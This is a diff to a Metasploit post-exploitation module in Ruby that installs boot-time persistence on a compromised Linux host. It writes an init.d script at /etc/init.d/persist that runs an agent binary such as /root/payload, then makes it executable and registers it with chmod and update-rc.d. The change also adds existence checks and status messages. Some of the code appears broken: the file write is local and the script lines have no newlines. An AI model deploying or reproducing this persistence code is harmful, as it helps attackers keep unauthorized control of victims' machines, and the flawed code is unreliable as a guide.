@@ -138,20 +138,50 @@ class MetasploitModule < Msf::Post
 
 
 
-
 #
-# Build init.d persistence script ..
+# Build remote init.d persistence script ..
 #
 def ls_stage1
 
+  file_temp=''
+  session = client
   init_check = datastore['INIT_PATH']    # /etc/init.d
   remote_path = datastore['REMOTE_PATH'] # /root/payload
   script_check = "#{init_check}/persist" # /etc/init.d/persist
+  #
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options ..
+  #
+  if datastore['REMOTE_PATH'] == 'nil'
+    vprint_error("Options not configurated correctly ..")
+    vprint_warning("Please set REMOTE_PATH options!")
+    return nil
+  else
+    vprint_status("Persisting: #{remote_path} agent ..")
+    Rex::sleep(1.0)
+  end
+
     #
-    # This is the init.d script that provides persistence on startup ..
+    # Check if agent its deployed in target system ..
     #
-    # File.open("#{init_check}/persist", "w+") {|f| f.write("#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          persistence on kali\n# Required-Start:    $network $local_fs $remote_fs\n# Required-Stop:     $remote_fs $local_fs\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n# Short-Description: Persiste your binary (elf) in kali linux.\n# Description:       Allows users to persiste your binary (elf) in kali linux systems\n### END INIT INFO\n#\n# Give a little time to execute elf agent\nsleep 5 > /dev/null\n# Execute binary (elf agent)\n./root/payload") }
+    if not session.fs.file.exist?(remote_path)
+      vprint_error("%red" + "agent: #{remote_path} not found ..")
+      return nil
+    end
     #
+    # Check init.d directory existance ..
+    #
+    if not session.fs.directory.exist?(init_check)
+      vprint_error("%red" + "path: #{init_check} not found ..")
+      return nil
+    end
+
+      #
+      # This is the init.d script that provides persistence on startup ..
+      #
+      vprint_warning("writing init.d startup script ..")
+      Rex::sleep(1.0)
+      vprint_good("remote path: #{init_check}/persist")
       File.open("#{init_check}/persist", "w+") do |f|
         f.write("#!/bin/sh")
         f.write("### BEGIN INIT INFO")
@@ -168,25 +198,33 @@ def ls_stage1
         f.write("sleep 5 > /dev/null")
         f.write("./#{remote_path}")
       end
-
-
       #
-      # Config init.d startup (chmod + update-rc.d)
+      # Config init.d startup service (chmod + update-rc.d)
       #
-      if File.exists?(script_check)
-        cmd_exec("chmod +x #{init_check}/persist")
+      if session.fs.file.exist?(script_check)
+        vprint_status("Config init.d persistence script ..")
+        Rex::sleep(1.0)
+        cmd_exec("chmod +x #{script_check}")
+        vprint_status("Update init.d service status ..")
+        Rex::sleep(1.0)
         cmd_exec("update-rc.d persist defaults # 97 03")
+      else
+        vprint_error("%red" + "init.d script: #{script_check} not found ..")
+        return nil
       end
 
-
     #
-    # Save in loot (remote path of binary to be executed)
+    # Final displays to user ..
     #
-    # p1 = store_loot("linux.persist", "text/plain", session, persist_file, "persist.tx", "Linux Pesistence")
-    # vprint_status("Binay remote path: #{p1.to_s}")
+    vprint_status("persistence activated on remote system ..")
+    vprint_status("agent to exec: #{remote_path}")
+    vprint_status("init.d script: #{script_check}")
+    vprint_line("")
+    Rex::sleep(1.0)
 
-
+  #
   # error exception funtion
+  #
   rescue ::Exception => e
   vprint_error("Error: #{e.class} #{e}")
 end
@@ -212,7 +250,6 @@ def run
       runtor = client.sys.config.getuid
       runsession = client.session_host
       directory = client.fs.dir.pwd
-
 
 
     # Print banner and scan results on screen
